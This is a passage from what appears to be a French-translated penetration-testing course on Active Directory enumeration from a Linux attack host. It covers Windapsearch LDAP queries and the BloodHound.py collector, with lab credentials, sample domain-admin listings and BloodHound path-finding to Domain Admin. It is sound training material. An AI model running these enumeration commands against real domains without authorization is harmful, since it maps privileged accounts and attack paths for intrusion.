Notez que cet environnement shell n'est pas entièrement interactif, donc chaque commande émise exécutera un nouveau cmd.exe à partir de WMI et exécutera votre commande. L'inconvénient est que si un défenseur vigilant vérifie les journaux d'événements et examine l'ID d'événement [4688 : Un nouveau processus a été créé](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688) , il verra un nouveau processus créé pour générer cmd.exe et émettre une commande. Il ne s'agit pas toujours d'une activité malveillante puisque de nombreuses organisations utilisent WMI pour administrer les ordinateurs, mais cela peut être un indice dans une enquête. Dans l'image ci-dessus, il est également évident que le processus s'exécute dans le contexte de l'utilisateur`wley`sur l'hôte, pas en tant que SYSTEM. Impacket est un outil extrêmement précieux qui a de nombreux cas d'utilisation. Nous verrons de nombreux autres outils dans la boîte à outils Impacket tout au long de ce module. En tant que pentester travaillant avec des hôtes Windows, cet outil devrait toujours être dans notre arsenal. Passons à l'outil suivant, `Windapsearch`.

* * * * *

Recherche Windap
----------------

[Windapsearch](https://github.com/ropnop/windapsearch) est un autre script Python pratique que nous pouvons utiliser pour énumérer les utilisateurs, les groupes et les ordinateurs d'un domaine Windows en utilisant des requêtes LDAP. Il est présent dans le répertoire /opt/windapsearch/ de notre hôte d'attaque.

#### Aide Windapsearch

  Aide Windapsearch

```
dsgsec@htb[/htb]$ windapsearch.py -h

usage: windapsearch.py [-h] [-d DOMAIN] [--dc-ip DC_IP] [-u USER]
                       [-p PASSWORD] [--functionality] [-G] [-U] [-C]
                       [-m GROUP_NAME] [--da] [--admin-objects] [--user-spns]
                       [--unconstrained-users] [--unconstrained-computers]
                       [--gpos] [-s SEARCH_TERM] [-l DN]
                       [--custom CUSTOM_FILTER] [-r] [--attrs ATTRS] [--full]
                       [-o output_dir]

Script to perform Windows domain enumeration through LDAP queries to a Domain
Controller

optional arguments:
  -h, --help            show this help message and exit

Domain Options:
  -d DOMAIN, --domain DOMAIN
                        The FQDN of the domain (e.g. 'lab.example.com'). Only
                        needed if DC-IP not provided
  --dc-ip DC_IP         The IP address of a domain controller

Bind Options:
  Specify bind account. If not specified, anonymous bind will be attempted

  -u USER, --user USER  The full username with domain to bind with (e.g.
                        'ropnop@lab.example.com' or 'LAB\ropnop'
  -p PASSWORD, --password PASSWORD
                        Password to use. If not specified, will be prompted
                        for

Enumeration Options:
  Data to enumerate from LDAP

  --functionality       Enumerate Domain Functionality level. Possible through
                        anonymous bind
  -G, --groups          Enumerate all AD Groups
  -U, --users           Enumerate all AD Users
  -PU, --privileged-users
                        Enumerate All privileged AD Users. Performs recursive
                        lookups for nested members.
  -C, --computers       Enumerate all AD Computers

  <SNIP>

```

Nous avons plusieurs options avec Windapsearch pour effectuer une énumération standard (vidage des utilisateurs, des ordinateurs et des groupes) et une énumération plus détaillée. L' `--da`option (énumérer les membres du groupe d'administrateurs de domaine) et les `-PU`options (trouver les utilisateurs privilégiés). L' `-PU`option est intéressante car elle effectuera une recherche récursive des utilisateurs avec une appartenance à un groupe imbriqué.

#### Windapsearch - Administrateurs de domaine

  Windapsearch - Administrateurs de domaine

```
dsgsec@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as:
[+]	 u:INLANEFREIGHT\forend
[+] Attempting to enumerate all Domain Admins
[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]	Found 28 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

<SNIP>

```

D'après les résultats du shell ci-dessus, nous pouvons voir qu'il a énuméré 28 utilisateurs du groupe Administrateurs du domaine. Prenez note de quelques utilisateurs que nous avons déjà vus auparavant et qui peuvent même avoir un mot de passe haché ou en clair comme `wley`, `svc_qualys`et `lab_adm`.

Pour identifier plus d'utilisateurs potentiels, nous pouvons exécuter l'outil avec l' `-PU`indicateur et vérifier les utilisateurs avec des privilèges élevés qui peuvent être passés inaperçus. Il s'agit d'une excellente vérification pour la création de rapports, car elle informera très probablement le client des utilisateurs disposant de privilèges excessifs en raison de l'appartenance à un groupe imbriqué.

#### Windapsearch - Utilisateurs privilégiés

  Windapsearch - Utilisateurs privilégiés

```
dsgsec@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as:
[+]      u:INLANEFREIGHT\forend
[+] Attempting to enumerate all AD privileged users
[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 28 nested users for group Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Angela Dunn
userPrincipalName: adunn@inlanefreight.local

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

cn: Dorothy Click
userPrincipalName: dclick@inlanefreight.local

<SNIP>

[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 3 nested users for group Enterprise Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Sharepoint Admin
userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL

<SNIP>

```

Vous remarquerez qu'il a effectué des mutations par rapport aux noms de groupe élevés communs dans différentes langues. Cette sortie donne un exemple des dangers de l'appartenance à un groupe imbriqué, et cela deviendra plus évident lorsque nous travaillerons avec des graphiques BloodHound pour visualiser cela.

* * * * *

Bloodhound.py
-------------

Une fois que nous avons les informations d'identification du domaine, nous pouvons exécuter l' ingestor [BloodHound.py](https://github.com/fox-it/BloodHound.py) BloodHound à partir de notre hôte d'attaque Linux. BloodHound est l'un des outils, sinon le plus percutant, jamais publié pour auditer la sécurité d'Active Directory, et il est extrêmement bénéfique pour nous en tant que testeurs d'intrusion. Nous pouvons prendre de grandes quantités de données qui prendraient du temps à passer au crible et à créer des représentations graphiques ou des "chemins d'attaque" de l'endroit où l'accès avec un utilisateur particulier peut mener. Nous trouverons souvent des failles nuancées dans un environnement AD qui auraient été manquées sans la possibilité d'exécuter des requêtes avec l'outil d'interface graphique BloodHound et de visualiser les problèmes. L'outil utilise [la théorie des graphes](https://en.wikipedia.org/wiki/Graph_theory)pour représenter visuellement les relations et découvrir des chemins d'attaque qui auraient été difficiles, voire impossibles à détecter avec d'autres outils. L'outil se compose de deux parties : le [collecteur SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) écrit en C # pour une utilisation sur les systèmes Windows, ou pour cette section, le collecteur BloodHound.py (également appelé `ingestor`) et l' outil [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI qui nous permet de télécharger les données collectées dans le forme de fichiers JSON. Une fois téléchargés, nous pouvons exécuter diverses requêtes prédéfinies ou écrire des requêtes personnalisées à l'aide du [langage Cypher](https://blog.cptjesus.com/posts/introtocypher) . L'outil collecte des données d'AD telles que les utilisateurs, les groupes, les ordinateurs, l'appartenance à un groupe, les GPO, les ACL, les approbations de domaine, l'accès administrateur local, les sessions utilisateur, les propriétés de l'ordinateur et de l'utilisateur, l'accès RDP, l'accès WinRM, etc.

Il n'était initialement publié qu'avec un collecteur PowerShell, il devait donc être exécuté à partir d'un hôte Windows. Finalement, un port Python (qui nécessite Impacket, `ldap3`, et `dnspython`) a été publié par un membre de la communauté. Cela a énormément aidé lors des tests de pénétration lorsque nous avons des informations d'identification de domaine valides, mais que nous n'avons pas le droit d'accéder à un hôte Windows joint à un domaine ou que nous n'avons pas d'hôte d'attaque Windows à partir duquel exécuter le collecteur SharpHound. Cela nous aide également à ne pas avoir à exécuter le collecteur à partir d'un hôte de domaine, qui pourrait potentiellement être bloqué ou déclencher des alertes (bien que même l'exécuter à partir de notre hôte d'attaque déclenchera très probablement des alarmes dans des environnements bien protégés).

L'exécution `bloodhound-python -h`à partir de notre hôte d'attaque Linux nous montrera les options disponibles.

#### Options de BloodHound.py

  Options de BloodHound.py

```
dsgsec@htb[/htb]$ bloodhound-python -h

usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME]
                         [-p PASSWORD] [-k] [--hashes HASHES] [-ns NAMESERVER]
                         [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-d DOMAIN]
                         [-dc HOST] [-gc HOST] [-w WORKERS] [-v]
                         [--disable-pooling] [--disable-autogc] [--zip]

Python based ingestor for BloodHound
For help or reporting issues, visit https://github.com/Fox-IT/BloodHound.py

optional arguments:
  -h, --help            show this help message and exit
  -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD
                        Which information to collect. Supported: Group,
                        LocalAdmin, Session, Trusts, Default (all previous),
                        DCOnly (no computer connections), DCOM, RDP,PSRemote,
                        LoggedOn, ObjectProps, ACL, All (all except LoggedOn).
                        You can specify more than one by separating them with
                        a comma. (default: Default)
  -u USERNAME, --username USERNAME
                        Username. Format: username[@domain]; If the domain is
                        unspecified, the current domain is used.
  -p PASSWORD, --password PASSWORD
                        Password

  <SNIP>

```

Comme nous pouvons le voir, l'outil accepte diverses méthodes de collecte avec le drapeau `-c`ou `--collectionmethod`. Nous pouvons récupérer des données spécifiques telles que les sessions utilisateur, les utilisateurs et les groupes, les propriétés des objets, l'ACLS, ou choisir `all`de collecter autant de données que possible. Exécutons-le de cette façon.

#### Exécution de BloodHound.py

  Exécution de BloodHound.py

```
dsgsec@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 564 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 2951 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers

<SNIP>

```

La commande ci-dessus a exécuté Bloodhound.py avec l'utilisateur `forend`. Nous avons spécifié notre serveur de noms en tant que contrôleur de domaine avec le `-ns`drapeau et le domaine, INLANEFREIGHt.LOCAL avec le `-d`drapeau. Le `-c all`drapeau a dit à l'outil d'exécuter toutes les vérifications. Une fois le script terminé, nous verrons les fichiers de sortie dans le répertoire de travail actuel au format <date_object.json>.

#### Affichage des résultats

  Affichage des résultats

```
dsgsec@htb[/htb]$ ls

20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json

```

#### Téléchargez le fichier Zip dans l'interface graphique de BloodHound

Nous pourrions ensuite taper `sudo neo4j start`pour démarrer le service [neo4j](https://neo4j.com/) , lancer la base de données dans laquelle nous allons charger les données et également exécuter des requêtes Cypher.

Ensuite, nous pouvons taper `bloodhound`à partir de notre hôte d'attaque Linux lorsque nous sommes connectés en utilisant `freerdp`pour démarrer l'application BloodHound GUI et télécharger les données. Les informations d'identification sont préremplies sur l'hôte d'attaque Linux, mais si, pour une raison quelconque, une invite d'informations d'identification s'affiche, utilisez :

-   `user == neo4j`/ `pass == HTB_@cademy_stdnt!`.

Une fois que tout ce qui précède est fait, nous devrions avoir l'outil d'interface graphique BloodHound chargé avec une ardoise vierge. Nous devons maintenant télécharger les données. Nous pouvons soit télécharger chaque fichier JSON un par un, soit les compresser d'abord avec une commande telle que `zip -r ilfreight_bh.zip *.json`et télécharger le fichier Zip. Pour ce faire, cliquez sur le `Upload Data`bouton situé à droite de la fenêtre (flèche verte). Lorsque la fenêtre du navigateur de fichiers apparaît pour sélectionner un fichier, choisissez le fichier zip (ou chaque fichier JSON) (flèche rouge) et appuyez sur `Open`.

#### Téléchargement du fichier Zip

![image](https://academy.hackthebox.com/storage/modules/143/bh-injest.png)

Maintenant que les données sont chargées, nous pouvons utiliser l'onglet Analyse pour exécuter des requêtes sur la base de données. Ces requêtes peuvent être personnalisées et spécifiques à ce que vous décidez à l'aide [de requêtes Cypher personnalisées](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/) . Il existe de nombreuses feuilles de triche pour nous aider ici. Nous discuterons plus en détail des requêtes Cypher personnalisées dans une section ultérieure. `Path Finding`Comme on le voit ci-dessous, nous pouvons utiliser les requêtes intégrées sur `Analysis tab`le `Left`côté de la fenêtre.

#### Recherche de relations

![image](https://academy.hackthebox.com/storage/modules/143/bh-analysis.png)

La requête choisie pour produire la carte ci-dessus était `Find Shortest Paths To Domain Admins`. Il nous donnera tous les chemins logiques trouvés via les utilisateurs/groupes/hôtes/ACL/GPO, etc., relations qui nous permettront probablement de passer aux privilèges d'administrateur de domaine ou équivalent. Cela sera extrêmement utile lors de la planification de nos prochaines étapes pour le mouvement latéral à travers le réseau. Prenez le temps d'expérimenter les différentes fonctionnalités : regardez l' `Database Info`onglet après avoir téléchargé les données, recherchez un nœud tel que `Domain Users`et, faites défiler toutes les options sous l' `Node Info`onglet, consultez les requêtes prédéfinies sous le`Analysis`tab, dont beaucoup sont puissants et peuvent rapidement trouver différentes façons de prendre le contrôle de domaine. Enfin, expérimentez certaines requêtes Cypher personnalisées en sélectionnant celles qui sont intéressantes dans la feuille de triche Cypher liée ci-dessus, en les collant dans la `Raw Query`case en bas et en appuyant sur Entrée. Vous pouvez également jouer avec le `Settings`menu en cliquant sur l'icône d'engrenage sur le côté droit de l'écran et en ajustant l'affichage des nœuds et des bords, en activant le mode de débogage des requêtes et en activant le mode sombre. Tout au long du reste de ce module, nous utiliserons BloodHound de différentes manières, mais pour une étude dédiée à l'outil BloodHound, consultez le module [Active Directory BloodHound .](https://academy.hackthebox.com/course/preview/active-directory-bloodhound)

Dans la section suivante, nous couvrirons l'exécution du collecteur SharpHound à partir d'un hôte Windows joint à un domaine et travaillerons sur quelques exemples d'utilisation des données dans l'interface graphique BloodHound.

* * * * *

Nous avons expérimenté plusieurs nouveaux outils d'énumération de domaine à partir d'un hôte Linux. La section suivante couvrira plusieurs autres outils que nous pouvons utiliser à partir d'un hôte Windows joint à un domaine. En bref, si vous n'avez pas encore vérifié le [projet WADComs](https://wadcoms.github.io/) , vous devriez certainement le faire. Il s'agit d'une feuille de triche interactive pour de nombreux outils que nous aborderons (et plus) dans ce module. C'est extrêmement utile lorsque vous ne vous souvenez pas de la syntaxe exacte de la commande ou que vous essayez un outil pour la première fois. Cela vaut la peine d'être mis en signet et même d'y [contribuer](https://wadcoms.github.io/contribute/) !

Maintenant, changeons de vitesse et commençons à creuser dans le domaine INLANEFREIGHT.LOCAL à partir de notre hôte d'attaque Windows.
